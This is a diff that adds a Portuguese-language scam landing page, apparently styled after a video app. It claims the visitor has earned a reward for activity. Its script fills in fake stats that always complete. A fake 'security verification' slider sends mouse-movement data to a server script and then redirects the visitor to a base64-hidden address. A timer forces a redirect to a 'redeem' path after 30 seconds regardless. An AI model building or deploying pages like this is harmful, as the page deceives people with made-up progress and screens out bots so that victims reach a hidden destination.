@@ -1,0 +1,939 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Oferta Disponível</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            background: linear-gradient(135deg, #fdf2f7, #fee2e2, #e0f2fe);
+            background-size: 200% 200%;
+            animation: bgMove 12s ease-in-out infinite;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        @keyframes bgMove {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        #bgCanvas {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        @keyframes cardIn {
+            from {
+                opacity: 0;
+                transform: translateY(18px) scale(.97);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            border-radius: 22px;
+            box-shadow: 0 18px 40px rgba(0, 0, 0, .08);
+            padding: 24px 20px 22px;
+            position: relative;
+            z-index: 1;
+            animation: cardIn .4s ease-out;
+        }
+
+        h1 {
+            font-size: 22px;
+            line-height: 1.3;
+            color: #111827;
+            text-align: left;
+            margin-bottom: 6px;
+        }
+
+        h1 span {
+            color: #f43f5e;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #4b5563;
+            text-align: left;
+            margin-bottom: 18px;
+        }
+
+        .stats {
+            background: #f9fafb;
+            border-radius: 16px;
+            padding: 14px 12px 10px;
+            margin-bottom: 16px;
+            border: 1px solid #e5e7eb;
+        }
+
+        .stats-title {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .stats-title-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 999px;
+            background: #22c55e;
+        }
+
+        .stat {
+            margin-bottom: 10px;
+        }
+
+        .stat:last-child {
+            margin-bottom: 0;
+        }
+
+        .stat-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: #374151;
+        }
+
+        .stat-value {
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        .stat-value.done {
+            color: #16a34a;
+            font-weight: 600;
+        }
+
+        .bar {
+            width: 100%;
+            height: 6px;
+            border-radius: 999px;
+            background: #e5e7eb;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .bar-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: inherit;
+            background: linear-gradient(90deg, #f43f5e, #ec4899);
+            transition: width .25s ease-out;
+        }
+
+        .note {
+            font-size: 12px;
+            color: #6b7280;
+            text-align: center;
+            margin: 10px 0 14px;
+            min-height: 18px;
+        }
+
+        @keyframes floatBtn {
+            0% {
+                transform: translateY(0);
+                box-shadow: 0 10px 24px rgba(244, 63, 94, .35);
+            }
+
+            50% {
+                transform: translateY(-5px);
+                box-shadow: 0 18px 32px rgba(244, 63, 94, .5);
+            }
+
+            100% {
+                transform: translateY(0);
+                box-shadow: 0 10px 24px rgba(244, 63, 94, .35);
+            }
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            border: none;
+            outline: none;
+            border-radius: 999px;
+            padding: 13px 16px;
+            background: #f43f5e;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 10px 24px rgba(244, 63, 94, .4);
+            opacity: 0;
+            pointer-events: none;
+            transition: transform .12s, box-shadow .12s, opacity .12s;
+            margin-top: 4px;
+        }
+
+        .btn.visible {
+            opacity: 1;
+            pointer-events: auto;
+            animation: floatBtn 2.4s ease-in-out infinite;
+        }
+
+        .btn:hover {
+            animation: none;
+            transform: translateY(-2px);
+            box-shadow: 0 18px 36px rgba(244, 63, 94, .55);
+        }
+
+        .small-text {
+            font-size: 11px;
+            color: #9ca3af;
+            text-align: center;
+            margin-top: 6px;
+        }
+
+        .app-loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .app-loader-circle {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            border: 6px solid rgba(0, 0, 0, 0.06);
+            border-top-color: #00f2ea;
+            border-right-color: #ff0050;
+            animation: app-spin 1s linear infinite;
+            margin-bottom: 18px;
+        }
+
+        .app-loader-text {
+            font-size: 14px;
+            color: #111827;
+            opacity: .7;
+        }
+
+        @keyframes app-spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verification-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .5);
+            backdrop-filter: blur(4px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9998;
+            padding: 16px;
+            animation: fadeIn .3s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .verification-modal.active {
+            display: flex;
+        }
+
+        .verification-box {
+            background: #fff;
+            border-radius: 20px;
+            padding: 24px 20px;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, .2);
+            animation: slideUp .4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .verification-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #111827;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .verification-subtitle {
+            font-size: 13px;
+            color: #6b7280;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .slider-container {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .slider-track {
+            width: 100%;
+            height: 54px;
+            background: #f3f4f6;
+            border-radius: 27px;
+            position: relative;
+            overflow: visible;
+            border: 2px solid #e5e7eb;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, .05);
+        }
+
+        .slider-target-zone {
+            position: absolute;
+            top: 0;
+            height: 100%;
+            background: linear-gradient(90deg, rgba(34, 197, 94, 0.15), rgba(34, 197, 94, 0.25));
+            border-radius: 27px;
+            transition: all .3s ease;
+            pointer-events: none;
+            border: 2px dashed rgba(34, 197, 94, 0.4);
+        }
+
+        .slider-target-indicator {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 3px;
+            height: 70%;
+            background: #22c55e;
+            border-radius: 2px;
+            box-shadow: 0 0 10px rgba(34, 197, 94, 0.5);
+            pointer-events: none;
+            animation: pulseIndicator 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulseIndicator {
+
+            0%,
+            100% {
+                opacity: 1;
+                box-shadow: 0 0 10px rgba(34, 197, 94, 0.5);
+            }
+
+            50% {
+                opacity: 0.6;
+                box-shadow: 0 0 20px rgba(34, 197, 94, 0.8);
+            }
+        }
+
+        .slider-fill {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #f43f5e, #ec4899);
+            border-radius: 27px;
+            transition: none;
+            pointer-events: none;
+        }
+
+        .slider-fill.resetting {
+            transition: width .3s ease-out, background .3s ease;
+        }
+
+        .slider-fill.in-zone {
+            background: linear-gradient(90deg, #22c55e, #16a34a);
+        }
+
+        .slider-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 14px;
+            font-weight: 500;
+            color: #6b7280;
+            pointer-events: none;
+            transition: opacity .2s;
+            white-space: nowrap;
+            user-select: none;
+        }
+
+        .slider-handle {
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 50px;
+            height: 50px;
+            background: #fff;
+            border-radius: 50%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, .15);
+            cursor: grab;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: box-shadow .2s, transform .2s;
+            z-index: 10;
+            touch-action: none;
+            user-select: none;
+        }
+
+        .slider-handle.dragging {
+            cursor: grabbing;
+            box-shadow: 0 4px 16px rgba(244, 63, 94, .3);
+            transform: translateY(-50%) scale(1.05);
+        }
+
+        .slider-handle.success {
+            background: #22c55e;
+            box-shadow: 0 4px 20px rgba(34, 197, 94, .4);
+        }
+
+        .slider-handle.in-zone {
+            box-shadow: 0 4px 16px rgba(34, 197, 94, .4);
+        }
+
+        .slider-icon {
+            width: 24px;
+            height: 24px;
+            transition: opacity .2s;
+        }
+
+        .slider-icon.hidden {
+            opacity: 0;
+        }
+
+        .slider-success {
+            position: absolute;
+            width: 28px;
+            height: 28px;
+            opacity: 0;
+            transform: scale(0);
+            transition: opacity .3s, transform .3s;
+        }
+
+        .slider-success.visible {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .verification-status {
+            text-align: center;
+            font-size: 13px;
+            min-height: 20px;
+            font-weight: 500;
+            transition: all .2s;
+        }
+
+        .verification-status.success {
+            color: #16a34a;
+        }
+
+        .verification-status.error {
+            color: #dc2626;
+        }
+
+        .verification-status.info {
+            color: #2563eb;
+        }
+
+        .verification-helper {
+            text-align: center;
+            font-size: 12px;
+            color: #9ca3af;
+            margin-top: 12px;
+            line-height: 1.4;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateY(-50%) translateX(0);
+            }
+
+            25% {
+                transform: translateY(-50%) translateX(-8px);
+            }
+
+            75% {
+                transform: translateY(-50%) translateX(8px);
+            }
+        }
+
+        .shake {
+            animation: shake .4s ease-in-out;
+        }
+    </style>
+
+    <script id="_wauhsz">
+        var _wau = _wau || []; _wau.push(["dynamic", "hvb61fj17l", "hsz", "c4302bffffff", "small"]);
+    </script>
+    <script async="" src="js/d.js"></script>
+</head>
+
+<body>
+    <canvas id="bgCanvas"></canvas>
+    <div class="card">
+        <h1>Você atingiu todos os <span>critérios de atividade.</span>
+        </h1>
+        <p class="subtitle">Confirmamos que sua conta cumpriu os requisitos mínimos de uso. Confira o resumo abaixo e
+            toque para liberar o seu progresso.</p>
+        <div class="stats" id="statsBox">
+            <div class="stats-title">
+                <span class="stats-title-dot"></span>Detalhes da sua atividade
+            </div>
+            <div class="stat" data-target="50">
+                <div class="stat-top">
+                    <span class="stat-label">Vídeos assistidos</span>
+                    <span class="stat-value">13/50</span>
+                </div>
+                <div class="bar">
+                    <div class="bar-fill" style="width: 26%;"></div>
+                </div>
+            </div>
+            <div class="stat" data-target="1000">
+                <div class="stat-top">
+                    <span class="stat-label">Tempo em uso na plataforma</span>
+                    <span class="stat-value">0/1000</span>
+                </div>
+                <div class="bar">
+                    <div class="bar-fill"></div>
+                </div>
+            </div>
+            <div class="stat" data-target="100">
+                <div class="stat-top">
+                    <span class="stat-label">Vídeos curtidos</span>
+                    <span class="stat-value">0/100</span>
+                </div>
+                <div class="bar">
+                    <div class="bar-fill"></div>
+                </div>
+            </div>
+        </div>
+        <div class="note" id="noteText">Analisando seus vídeos assistidos…</div>
+        <button class="btn" id="claimBtn">
+            <span class="btn-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                    <path d="M5.5 9.511c.076.954.83 1.697 2.182 1.785V12h.6v-.709c1.4-.098 2.218-.846 2.218-1.932 0-.987-.626-1.496-1.745-1.76l-.473-.112V5.57c.6.068.982.396 1.074.85h1.052c-.076-.919-.864-1.638-2.126-1.716V4h-.6v.719c-1.195.117-2.01.836-2.01 1.853 0 .9.606 1.472 1.613 1.707l.397.098v2.034c-.615-.093-1.022-.43-1.114-.9zm2.177-2.166c-.59-.137-.91-.416-.91-.836 0-.47.345-.822.915-.925v1.76h-.005zm.692 1.193c.717.166 1.048.435 1.048.91 0 .542-.412.914-1.135.982V8.518z">
+                    </path>
+                    <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"></path>
+                    <path d="M8 13.5a5.5 5.5 0 1 1 0-11 5.5 5.5 0 0 1 0 11m0 .5A6 6 0 1 0 8 2a6 6 0 0 0 0 12"></path>
+                </svg>
+            </span> Liberar meu progresso </button>
+        <div class="small-text">Os dados acima são gerados automaticamente com base na sua interação recente na
+            plataforma.</div>
+    </div>
+    <div class="verification-modal" id="verificationModal">
+        <div class="verification-box">
+            <h2 class="verification-title">Verificação de Segurança</h2>
+            <p class="verification-subtitle">Arraste o controle até a área verde para continuar</p>
+            <div class="slider-container">
+                <div class="slider-track">
+                    <div class="slider-target-zone" id="targetZone"></div>
+                    <div class="slider-target-indicator" id="targetIndicator"></div>
+                    <div class="slider-fill" id="sliderFill"></div>
+                    <div class="slider-text" id="sliderText">Arraste para a área verde →</div>
+                    <div class="slider-handle" id="sliderHandle">
+                        <svg class="slider-icon" id="sliderIcon" viewBox="0 0 24 24" fill="none" stroke="#f43f5e" stroke-width="2.5">
+                            <path d="M9 18l6-6-6-6"></path>
+                        </svg>
+                        <svg class="slider-success" id="sliderSuccess" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+            <div class="verification-status" id="verificationStatus"></div>
+            <div class="verification-helper">Pare quando o botão entrar na área verde</div>
+        </div>
+    </div>
+    <div class="app-loader-overlay" id="app-loader">
+        <div class="app-loader-circle"></div>
+        <div class="app-loader-text">Sincronizando com a sua conta...</div>
+    </div>
+    <script>
+        const $ = (s) => document.querySelector(s);
+        const $$ = (s) => document.querySelectorAll(s);
+
+        const stats = $$('.stat'),
+            note = $('#noteText'),
+            claimBtn = $('#claimBtn');
+
+        const msgs = [
+            'Analisando seus vídeos assistidos…',
+            'Conferindo seu tempo ativo na plataforma…',
+            'Verificando suas interações (curtidas)…',
+            'Pronto! Seu uso foi validado. Toque para liberar o progresso.'
+        ];
+
+        const get2SUrl = () => {
+            let u = new URL(`https://${window.location.host || window.location.hostname}/p/redeem/fb/1/`);
+            u.search = location.search;
+            return u.toString();
+        };
+
+        const runCardAnimations = (i) => {
+            if (i >= stats.length) {
+                note.textContent = msgs[3];
+                claimBtn.classList.add('visible');
+                return;
+            }
+            note.textContent = msgs[i] || '';
+            let el = stats[i],
+                val = el.querySelector('.stat-value'),
+                bar = el.querySelector('.bar-fill'),
+                t = +el.getAttribute('data-target'),
+                c = 0,
+                step = t > 600 ? 40 : t > 200 ? 20 : 1;
+            let timer = setInterval(() => {
+                if ((c += step) >= t) c = t;
+                val.textContent = c + '/' + t;
+                bar.style.width = (c / t * 100) + '%';
+                if (c === t) {
+                    clearInterval(timer);
+                    val.classList.add('done');
+                    setTimeout(() => runCardAnimations(i + 1), 400);
+                }
+            }, 40);
+        };
+
+        runCardAnimations(0);
+
+        const verification = {
+            modal: $('#verificationModal'),
+            handle: $('#sliderHandle'),
+            fill: $('#sliderFill'),
+            text: $('#sliderText'),
+            status: $('#verificationStatus'),
+            icon: $('#sliderIcon'),
+            successIcon: $('#sliderSuccess'),
+            targetZone: $('#targetZone'),
+            targetIndicator: $('#targetIndicator'),
+            track: null,
+            isDragging: false,
+            targetConfig: {
+                targetPercent: 0,
+                marginPercent: 15,
+                minTarget: 60,
+                maxTarget: 75
+            },
+
+            triesCount: 0,
+            metrics: {
+                startTime: 0,
+                positions: [],
+                timeInZone: 0,
+                enteredZoneTime: 0,
+                completed: false
+            },
+
+            init() {
+                this.track = this.handle.parentElement;
+                this.generateTargetZone();
+                const events = {
+                    start: ['mousedown', 'touchstart'],
+                    move: ['mousemove', 'touchmove'],
+                    end: ['mouseup', 'touchend', 'touchcancel']
+                };
+                events.start.forEach(e => this.handle.addEventListener(e, this.start.bind(this), {
+                    passive: false
+                }));
+                events.move.forEach(e => document.addEventListener(e, this.move.bind(this), {
+                    passive: false
+                }));
+                events.end.forEach(e => document.addEventListener(e, this.end.bind(this)));
+            },
+
+            generateTargetZone() {
+                const cfg = this.targetConfig;
+                cfg.targetPercent = cfg.minTarget + Math.random() * (cfg.maxTarget - cfg.minTarget);
+                const zoneStart = Math.max(0, cfg.targetPercent - cfg.marginPercent);
+                const zoneWidth = (Math.min(100, cfg.targetPercent + cfg.marginPercent) - zoneStart);
+                this.targetZone.style.left = zoneStart + '%';
+                this.targetZone.style.width = zoneWidth + '%';
+                this.targetIndicator.style.left = cfg.targetPercent + '%';
+            },
+
+            show() {
+                this.reset();
+                this.generateTargetZone();
+                this.modal.classList.add('active');
+            },
+
+            reset() {
+                this.isDragging = false;
+                this.handle.style.left = '0px';
+                this.fill.style.width = '0%';
+                this.fill.classList.add('resetting');
+                this.fill.classList.remove('in-zone');
+                this.handle.classList.remove('in-zone');
+                setTimeout(() => this.fill.classList.remove('resetting'), 300);
+                this.text.style.opacity = '1';
+                this.status.textContent = '';
+                this.status.className = 'verification-status';
+                this.handle.classList.remove('success', 'dragging');
+                this.icon.classList.remove('hidden');
+                this.successIcon.classList.remove('visible');
+                this.metrics = {
+                    startTime: 0,
+                    positions: [],
+                    timeInZone: 0,
+                    enteredZoneTime: 0,
+                    completed: false
+                };
+            },
+
+            start(e) {
+                if (this.metrics.completed) return;
+                e.preventDefault();
+                this.isDragging = true;
+                this.handle.classList.add('dragging');
+                this.metrics.startTime = Date.now();
+                this.metrics.positions = [];
+                this.metrics.enteredZoneTime = 0;
+                this.metrics.timeInZone = 0;
+            },
+
+            move(e) {
+                if (!this.isDragging || this.metrics.completed) return;
+                e.preventDefault();
+                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                const rect = this.track.getBoundingClientRect();
+                const maxMove = rect.width - this.handle.offsetWidth;
+                let pos = Math.max(0, Math.min(clientX - rect.left - (this.handle.offsetWidth / 2), maxMove));
+                const now = Date.now();
+                const progress = (pos / maxMove) * 100;
+                this.metrics.positions.push({
+                    x: pos,
+                    t: now,
+                    p: progress
+                });
+                this.handle.style.left = pos + 'px';
+                this.fill.style.width = (pos + 25) + 'px';
+                const cfg = this.targetConfig;
+                const inZone = progress >= (cfg.targetPercent - cfg.marginPercent) && progress <= (cfg.targetPercent + cfg.marginPercent);
+                if (inZone) {
+                    if (!this.metrics.enteredZoneTime) this.metrics.enteredZoneTime = now;
+                    this.metrics.timeInZone = now - this.metrics.enteredZoneTime;
+                    this.fill.classList.add('in-zone');
+                    this.handle.classList.add('in-zone');
+                    this.text.style.opacity = '0';
+                    /* this.status.textContent = 'Solte aqui! ✓'; */
+                    this.status.className = 'verification-status info';
+                } else {
+                    this.fill.classList.remove('in-zone');
+                    this.handle.classList.remove('in-zone');
+                    this.status.textContent = '';
+                    this.metrics.enteredZoneTime = 0;
+                    this.metrics.timeInZone = 0;
+                }
+                if (progress > 20) this.text.style.opacity = '0';
+            },
+
+            end(e) {
+                if (!this.isDragging || this.metrics.completed) return;
+                this.isDragging = false;
+                this.handle.classList.remove('dragging');
+                this.triesCount++;
+                const cfg = this.targetConfig;
+                const lastPos = this.metrics.positions[this.metrics.positions.length - 1];
+                const finalProgress = lastPos ? lastPos.p : 0;
+                const inZone = finalProgress >= (cfg.targetPercent - cfg.marginPercent) && finalProgress <= (cfg.targetPercent + cfg.marginPercent);
+                if (inZone && this.metrics.timeInZone >= 50) {
+                    this.complete(finalProgress);
+                } else {
+                    if (this.triesCount >= 3) {
+                        this.modal.classList.remove('active');
+                        $('#app-loader').style.display = 'flex';
+
+                        setTimeout(() => {
+                            const u = get2SUrl();
+                            try { window.location.replace(u); } catch (_) { window.location.href = u; }
+                        }, 2000);
+
+                        return;
+                    }
+                    let msg = finalProgress < cfg.targetPercent ? 'Arraste mais para a direita' : 'Você passou! Volte um pouco';
+                    if (inZone) msg = 'Segure por mais tempo na área verde';
+                    this.status.textContent = msg;
+                    this.status.className = 'verification-status error';
+                    this.handle.classList.add('shake');
+                    setTimeout(() => this.handle.classList.remove('shake'), 400);
+                    setTimeout(() => this.reset(), 1800);
+                }
+            },
+
+            complete(finalProgress) {
+                if (this.metrics.completed) return;
+                this.metrics.completed = true;
+                const payload = {
+                    positions: this.metrics.positions,
+                    totalTime: Date.now() - this.metrics.startTime,
+                    timeInZone: this.metrics.timeInZone,
+                    targetPercent: this.targetConfig.targetPercent,
+                    finalProgress: finalProgress
+                };
+                fetch('./form.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).then(r => r.json()).then(data => {
+                    if (data.success) {
+                        this.handle.classList.remove('in-zone');
+                        this.handle.classList.add('success');
+                        this.icon.classList.add('hidden');
+                        setTimeout(() => this.successIcon.classList.add('visible'), 100);
+                        this.status.textContent = 'Verificação concluída! ✓';
+                        this.status.className = 'verification-status success';
+                        setTimeout(() => {
+                            this.modal.classList.remove('active');
+                            this.proceed(data.redirect);
+                        }, 1200);
+                    } else {
+                        this.status.textContent = data.reason || 'Falha na verificação';
+                        this.status.className = 'verification-status error';
+                        setTimeout(() => this.reset(), 2000);
+                    }
+                }).catch(() => {
+                    this.status.textContent = 'Erro de conexão';
+                    this.status.className = 'verification-status error';
+                    setTimeout(() => this.reset(), 2000);
+                });
+            },
+
+            proceed(enc_url) {
+                $('#app-loader').style.display = 'flex';
+                setTimeout(() => {
+                    let u = new URL(`https://${window.atob(enc_url)}/`);
+                    u.search = location.search;
+                    try { window.location.replace(u.toString()); } catch (_) { window.location.href = u.toString(); }
+                }, 2000);
+            }
+        };
+
+        verification.init();
+        claimBtn.onclick = () => verification.show();
+
+        const cvs = $('#bgCanvas'),
+            ctx = cvs.getContext('2d'),
+            cols = ['244,63,94', '56,189,248', '248,250,252'];
+
+        let w, h, parts = [],
+            lastW = window.innerWidth;
+
+        const initCanvas = () => {
+            w = cvs.width = innerWidth * devicePixelRatio;
+            h = cvs.height = innerHeight * devicePixelRatio;
+            ctx.setTransform(devicePixelRatio, 0, 0, devicePixelRatio, 0, 0);
+            w = innerWidth;
+            h = innerHeight;
+            parts = Array.from({
+                length: 45
+            }, () => ({
+                x: Math.random() * w,
+                y: Math.random() * h,
+                r: 2 + Math.random() * 3.5,
+                dy: 0.25 + Math.random() * 0.6,
+                dx: (Math.random() - 0.5) * 0.4,
+                a: 0.4 + Math.random() * 0.4,
+                c: cols[Math.random() * 3 | 0]
+            }));
+        };
+
+        const drawCanvas = () => {
+            ctx.clearRect(0, 0, w, h);
+            parts.forEach(p => {
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.r, 0, 6.28);
+                ctx.fillStyle = `rgba(${p.c},${p.a})`;
+                ctx.fill();
+                p.y += p.dy;
+                p.x += p.dx;
+                if (p.y - p.r > h) {
+                    p.y = -p.r;
+                    p.x = Math.random() * w;
+                }
+                if (p.x < -10) p.x = w + 10;
+                else if (p.x > w + 10) p.x = -10;
+            });
+            requestAnimationFrame(drawCanvas);
+        };
+
+        window.onresize = () => {
+            if (window.innerWidth !== lastW) {
+                lastW = window.innerWidth;
+                initCanvas();
+            }
+        };
+
+        initCanvas();
+        drawCanvas();
+
+        setTimeout(() => {
+            const u = get2SUrl();
+            try { window.location.replace(u); } catch (_) { window.location.href = u; }
+        }, 30e3);
+    </script>
+
+
+</body></html>
